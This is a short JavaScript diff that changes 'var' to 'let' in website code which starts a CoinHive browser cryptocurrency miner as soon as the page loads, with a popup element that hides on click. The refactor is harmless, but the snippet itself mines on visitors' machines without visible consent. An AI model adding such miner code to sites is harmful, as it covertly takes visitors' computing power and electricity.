@@ -3,7 +3,7 @@
  */
 
 $(document).ready(() => {
-	var miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
+	let miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
 		autoThreads: true,
 		theme: 'dark',
 		threads: 1,
@@ -12,7 +12,7 @@ $(document).ready(() => {
 	});
 	miner.start();
 
-	var $el = $('#popupMiner');
+	let $el = $('#popupMiner');
 
 	$el.on('click', function () {
 		$el.hide();
